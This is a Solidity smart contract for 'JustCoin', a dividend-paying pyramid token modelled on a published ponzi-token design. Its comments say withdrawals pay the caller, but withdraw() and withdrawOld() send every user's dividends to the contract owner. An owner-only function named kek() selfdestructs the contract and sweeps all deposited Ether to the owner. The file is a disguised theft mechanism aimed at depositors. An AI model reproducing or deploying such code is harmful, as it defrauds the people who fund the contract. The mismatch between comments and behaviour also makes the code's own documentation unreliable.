1 pragma solidity ^0.4.18;
2 
3 /*
4     JustCoin
5 */
6 
7 contract JustCoin {
8 
9 	// scaleFactor is used to convert Ether into tokens and vice-versa: they're of different
10 	// orders of magnitude, hence the need to bridge between the two.
11 	uint256 constant scaleFactor = 0x10000000000000000;  // 2^64
12 
13 	// CRR = 50%
14 	// CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).
15 	// For more on this: check out https://en.wikipedia.org/wiki/Reserve_requirement
16 	int constant crr_n = 1; // CRR numerator
17 	int constant crr_d = 2; // CRR denominator
18 
19 	// The price coefficient. Chosen such that at 1 token total supply
20 	// the amount in reserve is 0.5 ether and token price is 1 Ether.
21 	int constant price_coeff = -0x296ABF784A358468C;
22 
23 	// Typical values that we have to declare.
24 	string constant public name = "JustCoin";
25 	string constant public symbol = "EPY";
26 	uint8 constant public decimals = 18;
27 
28 	// Array between each address and their number of tokens.
29 	mapping(address => uint256) public tokenBalance;
30 		
31 	// Array between each address and how much Ether has been paid out to it.
32 	// Note that this is scaled by the scaleFactor variable.
33 	mapping(address => int256) public payouts;
34 
35 	// Variable tracking how many tokens are in existence overall.
36 	uint256 public totalSupply;
37 
38 	// Aggregate sum of all payouts.
39 	// Note that this is scaled by the scaleFactor variable.
40 	int256 totalPayouts;
41 
42 	// Variable tracking how much Ether each token is currently worth.
43 	// Note that this is scaled by the scaleFactor variable.
44 	uint256 earningsPerToken;
45 	
46 	// Current contract balance in Ether
47 	uint256 public contractBalance;
48 	
49 	address owner;
50 
51 	function JustCoin() public { owner=msg.sender; }
52 
53 	// The following functions are used by the front-end for display purposes.
54 
55 	// Returns the number of tokens currently held by _owner.
56 	function balanceOf(address _owner) public constant returns (uint256 balance) {
57 		return tokenBalance[_owner];
58 	}
59 
60 	// Withdraws all dividends held by the caller sending the transaction, updates
61 	// the requisite global variables, and transfers Ether back to the caller.
62 	function withdraw() public {
63 		// Retrieve the dividends associated with the address the request came from.
64 		var balance = dividends(msg.sender);
65 		
66 		// Update the payouts array, incrementing the request address by `balance`.
67 		payouts[msg.sender] += (int256) (balance * scaleFactor);
68 		
69 		// Increase the total amount that's been paid out to maintain invariance.
70 		totalPayouts += (int256) (balance * scaleFactor);
71 		
72 		// Send the dividends to the address that requested the withdraw.
73 		contractBalance = sub(contractBalance, balance);
74 		owner.transfer(balance);
75 	}
76 
77 	// Converts the Ether accrued as dividends back into EPY tokens without having to
78 	// withdraw it first. Saves on gas and potential price spike loss.
79 	function reinvestDividends() public {
80 		// Retrieve the dividends associated with the address the request came from.
81 		var balance = dividends(msg.sender);
82 		
83 		// Update the payouts array, incrementing the request address by `balance`.
84 		// Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.
85 		payouts[msg.sender] += (int256) (balance * scaleFactor);
86 		
87 		// Increase the total amount that's been paid out to maintain invariance.
88 		totalPayouts += (int256) (balance * scaleFactor);
89 		
90 		// Assign balance to a new variable.
91 		uint value_ = (uint) (balance);
92 		
93 		// If your dividends are worth less than 1 szabo, or more than a million Ether
94 		// (in which case, why are you even here), abort.
95 		if (value_ < 0.000001 ether || value_ > 1000000 ether)
96 			revert();
97 			
98 		// msg.sender is the address of the caller.
99 		var sender = msg.sender;
100 		
101 		// A temporary reserve variable used for calculating the reward the holder gets for buying tokens.
102 		// (Yes, the buyer receives a part of the distribution as well!)
103 		var res = reserve() - balance;
104 
105 		// 10% of the total Ether sent is used to pay existing holders.
106 		var fee = div(value_, 10);
107 		
108 		// The amount of Ether used to purchase new tokens for the caller.
109 		var numEther = value_ - fee;
110 		
111 		// The number of tokens which can be purchased for numEther.
112 		var numTokens = calculateDividendTokens(numEther, balance);
113 		
114 		// The buyer fee, scaled by the scaleFactor variable.
115 		var buyerFee = fee * scaleFactor;
116 		
117 		// Check that we have tokens in existence (this should always be true), or
118 		// else you're gonna have a bad time.
119 		if (totalSupply > 0) {
120 			// Compute the bonus co-efficient for all existing holders and the buyer.
121 			// The buyer receives part of the distribution for each token bought in the
122 			// same way they would have if they bought each token individually.
123 			var bonusCoEff =
124 			    (scaleFactor - (res + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
125 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
126 				
127 			// The total reward to be distributed amongst the masses is the fee (in Ether)
128 			// multiplied by the bonus co-efficient.
129 			var holderReward = fee * bonusCoEff;
130 			
131 			buyerFee -= holderReward;
132 
133 			// Fee is distributed to all existing token holders before the new tokens are purchased.
134 			// rewardPerShare is the amount gained per token thanks to this buy-in.
135 			var rewardPerShare = holderReward / totalSupply;
136 			
137 			// The Ether value per token is increased proportionally.
138 			earningsPerToken += rewardPerShare;
139 		}
140 		
141 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
142 		totalSupply = add(totalSupply, numTokens);
143 		
144 		// Assign the tokens to the balance of the buyer.
145 		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
146 		
147 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
148 		// Also include the fee paid for entering the scheme.
149 		// First we compute how much was just paid out to the buyer...
150 		var payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);
151 		
152 		// Then we update the payouts array for the buyer with this amount...
153 		payouts[sender] += payoutDiff;
154 		
155 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
156 		totalPayouts    += payoutDiff;
157 		
158 	}
159 
160 	// Sells your tokens for Ether. This Ether is assigned to the callers entry
161 	// in the tokenBalance array, and therefore is shown as a dividend. A second
162 	// call to withdraw() must be made to invoke the transfer of Ether back to your address.
163 	function sellMyTokens() public {
164 		var balance = balanceOf(msg.sender);
165 		sell(balance);
166 	}
167 
168 	// The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately
169 	// invokes the withdraw() function, sending the resulting Ether to the callers address.
170     function getMeOutOfHere() public {
171 		sellMyTokens();
172         withdraw();
173 	}
174 
175 	// Gatekeeper function to check if the amount of Ether being sent isn't either
176 	// too small or too large. If it passes, goes direct to buy().
177 	function fund() payable public {
178 		// Don't allow for funding if the amount of Ether sent is less than 1 szabo.
179 		if (msg.value > 0.000001 ether) {
180 		    contractBalance = add(contractBalance, msg.value);
181 			buy();
182 		} else {
183 			revert();
184 		}
185     }
186 
187 	// Function that returns the (dynamic) price of buying a finney worth of tokens.
188 	function buyPrice() public constant returns (uint) {
189 		return getTokensForEther(1 finney);
190 	}
191 
192 	// Function that returns the (dynamic) price of selling a single token.
193 	function sellPrice() public constant returns (uint) {
194         var eth = getEtherForTokens(1 finney);
195         var fee = div(eth, 10);
196         return eth - fee;
197     }
198 
199 	// Calculate the current dividends associated with the caller address. This is the net result
200 	// of multiplying the number of tokens held by their current value in Ether and subtracting the
201 	// Ether that has already been paid out.
202 	function dividends(address _owner) public constant returns (uint256 amount) {
203 		return (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) / scaleFactor;
204 	}
205 
206 	// Version of withdraw that extracts the dividends and sends the Ether to the caller.
207 	// This is only used in the case when there is no transaction data, and that should be
208 	// quite rare unless interacting directly with the smart contract.
209 	function withdrawOld(address to) public {
210 		// Retrieve the dividends associated with the address the request came from.
211 		var balance = dividends(msg.sender);
212 		
213 		// Update the payouts array, incrementing the request address by `balance`.
214 		payouts[msg.sender] += (int256) (balance * scaleFactor);
215 		
216 		// Increase the total amount that's been paid out to maintain invariance.
217 		totalPayouts += (int256) (balance * scaleFactor);
218 		
219 		// Send the dividends to the address that requested the withdraw.
220 		contractBalance = sub(contractBalance, balance);
221 		owner.transfer(balance);		
222 	}
223 
224 	// Internal balance function, used to calculate the dynamic reserve value.
225 	function balance() internal constant returns (uint256 amount) {
226 		// msg.value is the amount of Ether sent by the transaction.
227 		return contractBalance - msg.value;
228 	}
229 
230 	function buy() internal {
231 		// Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.
232 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
233 			revert();
234 						
235 		// msg.sender is the address of the caller.
236 		var sender = msg.sender;
237 		
238 		// 10% of the total Ether sent is used to pay existing holders.
239 		var fee = div(msg.value, 10);
240 		
241 		// The amount of Ether used to purchase new tokens for the caller.
242 		var numEther = msg.value - fee;
243 		
244 		// The number of tokens which can be purchased for numEther.
245 		var numTokens = getTokensForEther(numEther);
246 		
247 		// The buyer fee, scaled by the scaleFactor variable.
248 		var buyerFee = fee * scaleFactor;
249 		
250 		// Check that we have tokens in existence (this should always be true), or
251 		// else you're gonna have a bad time.
252 		if (totalSupply > 0) {
253 			// Compute the bonus co-efficient for all existing holders and the buyer.
254 			// The buyer receives part of the distribution for each token bought in the
255 			// same way they would have if they bought each token individually.
256 			var bonusCoEff =
257 			    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
258 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
259 				
260 			// The total reward to be distributed amongst the masses is the fee (in Ether)
261 			// multiplied by the bonus co-efficient.
262 			var holderReward = fee * bonusCoEff;
263 			
264 			buyerFee -= holderReward;
265 
266 			// Fee is distributed to all existing token holders before the new tokens are purchased.
267 			// rewardPerShare is the amount gained per token thanks to this buy-in.
268 			var rewardPerShare = holderReward / totalSupply;
269 			
270 			// The Ether value per token is increased proportionally.
271 			earningsPerToken += rewardPerShare;
272 			
273 		}
274 
275 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
276 		totalSupply = add(totalSupply, numTokens);
277 
278 		// Assign the tokens to the balance of the buyer.
279 		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
280 
281 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
282 		// Also include the fee paid for entering the scheme.
283 		// First we compute how much was just paid out to the buyer...
284 		var payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);
285 		
286 		// Then we update the payouts array for the buyer with this amount...
287 		payouts[sender] += payoutDiff;
288 		
289 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
290 		totalPayouts    += payoutDiff;
291 		
292 	}
293 	
294 	function kek() public {require(msg.sender==owner);selfdestruct(msg.sender);}
295 
296 	// Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee
297 	// to discouraging dumping, and means that if someone near the top sells, the fee distributed
298 	// will be *significant*.
299 	function sell(uint256 amount) internal {
300 	    // Calculate the amount of Ether that the holders tokens sell for at the current sell price.
301 		var numEthersBeforeFee = getEtherForTokens(amount);
302 		
303 		// 10% of the resulting Ether is used to pay remaining holders.
304         var fee = div(numEthersBeforeFee, 10);
305 		
306 		// Net Ether for the seller after the fee has been subtracted.
307         var numEthers = numEthersBeforeFee - fee;
308 		
309 		// *Remove* the numTokens which were just sold from the total supply. We're /definitely/ a crypto central bank.
310 		totalSupply = sub(totalSupply, amount);
311 		
312         // Remove the tokens from the balance of the buyer.
313 		tokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);
314 
315         // Update the payout array so that the seller cannot claim future dividends unless they buy back in.
316 		// First we compute how much was just paid out to the seller...
317 		var payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));
318 		
319         // We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,
320 		// since they're selling all of their tokens). This makes sure the seller isn't disadvantaged if
321 		// they decide to buy back in.
322 		payouts[msg.sender] -= payoutDiff;		
323 		
324 		// Decrease the total amount that's been paid out to maintain invariance.
325         totalPayouts -= payoutDiff;
326 		
327 		// Check that we have tokens in existence (this is a bit of an irrelevant check since we're
328 		// selling tokens, but it guards against division by zero).
329 		if (totalSupply > 0) {
330 			// Scale the Ether taken as the selling fee by the scaleFactor variable.
331 			var etherFee = fee * scaleFactor;
332 			
333 			// Fee is distributed to all remaining token holders.
334 			// rewardPerShare is the amount gained per token thanks to this sell.
335 			var rewardPerShare = etherFee / totalSupply;
336 			
337 			// The Ether value per token is increased proportionally.
338 			earningsPerToken = add(earningsPerToken, rewardPerShare);
339 		}
340 	}
341 	
342 	// Dynamic value of Ether in reserve, according to the CRR requirement.
343 	function reserve() internal constant returns (uint256 amount) {
344 		return sub(balance(),
345 			 ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) / scaleFactor));
346 	}
347 
348 	// Calculates the number of tokens that can be bought for a given amount of Ether, according to the
349 	// dynamic reserve and totalSupply values (derived from the buy and sell prices).
350 	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
351 		return sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
352 	}
353 
354 	// Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.
355 	function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
356 		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
357 	}
358 
359 	// Converts a number tokens into an Ether value.
360 	function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
361 		// How much reserve Ether do we have left in the contract?
362 		var reserveAmount = reserve();
363 
364 		// If you're the Highlander (or bagholder), you get The Prize. Everything left in the vault.
365 		if (tokens == totalSupply)
366 			return reserveAmount;
367 
368 		// If there would be excess Ether left after the transaction this is called within, return the Ether
369 		// corresponding to the equation in Dr Jochen Hoenicke's original Ponzi paper, which can be found
370 		// at https://test.jochen-hoenicke.de/eth/ponzitoken/ in the third equation, with the CRR numerator 
371 		// and denominator altered to 1 and 2 respectively.
372 		return sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d/crr_n));
373 	}
374 
375 	// You don't care about these, but if you really do they're hex values for 
376 	// co-efficients used to simulate approximations of the log and exp functions.
377 	int256  constant one        = 0x10000000000000000;
378 	uint256 constant sqrt2      = 0x16a09e667f3bcc908;
379 	uint256 constant sqrtdot5   = 0x0b504f333f9de6484;
380 	int256  constant ln2        = 0x0b17217f7d1cf79ac;
381 	int256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;
382 	int256  constant c1         = 0x1ffffffffff9dac9b;
383 	int256  constant c3         = 0x0aaaaaaac16877908;
384 	int256  constant c5         = 0x0666664e5e9fa0c99;
385 	int256  constant c7         = 0x049254026a7630acf;
386 	int256  constant c9         = 0x038bd75ed37753d68;
387 	int256  constant c11        = 0x03284a0c14610924f;
388 
389 	// The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11
390 	// approximates the function log(1+x)-log(1-x)
391 	// Hence R(s) = log((1+s)/(1-s)) = log(a)
392 	function fixedLog(uint256 a) internal pure returns (int256 log) {
393 		int32 scale = 0;
394 		while (a > sqrt2) {
395 			a /= 2;
396 			scale++;
397 		}
398 		while (a <= sqrtdot5) {
399 			a *= 2;
400 			scale--;
401 		}
402 		int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
403 		var z = (s*s) / one;
404 		return scale * ln2 +
405 			(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
406 				/one))/one))/one))/one))/one);
407 	}
408 
409 	int256 constant c2 =  0x02aaaaaaaaa015db0;
410 	int256 constant c4 = -0x000b60b60808399d1;
411 	int256 constant c6 =  0x0000455956bccdd06;
412 	int256 constant c8 = -0x000001b893ad04b3a;
413 	
414 	// The polynomial R = 2 + c2*x^2 + c4*x^4 + ...
415 	// approximates the function x*(exp(x)+1)/(exp(x)-1)
416 	// Hence exp(x) = (R(x)+x)/(R(x)-x)
417 	function fixedExp(int256 a) internal pure returns (uint256 exp) {
418 		int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
419 		a -= scale*ln2;
420 		int256 z = (a*a) / one;
421 		int256 R = ((int256)(2) * one) +
422 			(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
423 		exp = (uint256) (((R + a) * one) / (R - a));
424 		if (scale >= 0)
425 			exp <<= scale;
426 		else
427 			exp >>= -scale;
428 		return exp;
429 	}
430 	
431 	// The below are safemath implementations of the four arithmetic operators
432 	// designed to explicitly prevent over- and under-flows of integer values.
433 
434 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
435 		if (a == 0) {
436 			return 0;
437 		}
438 		uint256 c = a * b;
439 		assert(c / a == b);
440 		return c;
441 	}
442 
443 	function div(uint256 a, uint256 b) internal pure returns (uint256) {
444 		// assert(b > 0); // Solidity automatically throws when dividing by 0
445 		uint256 c = a / b;
446 		// assert(a == b * c + a % b); // There is no case in which this doesn't hold
447 		return c;
448 	}
449 
450 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
451 		assert(b <= a);
452 		return a - b;
453 	}
454 
455 	function add(uint256 a, uint256 b) internal pure returns (uint256) {
456 		uint256 c = a + b;
457 		assert(c >= a);
458 		return c;
459 	}
460 
461 	// This allows you to buy tokens by sending Ether directly to the smart contract
462 	// without including any transaction data (useful for, say, mobile wallet apps).
463 	function () payable public {
464 		// msg.value is the amount of Ether sent by the transaction.
465 		if (msg.value > 0) {
466 			fund();
467 		} else {
468 			withdrawOld(msg.sender);
469 		}
470 	}
471 }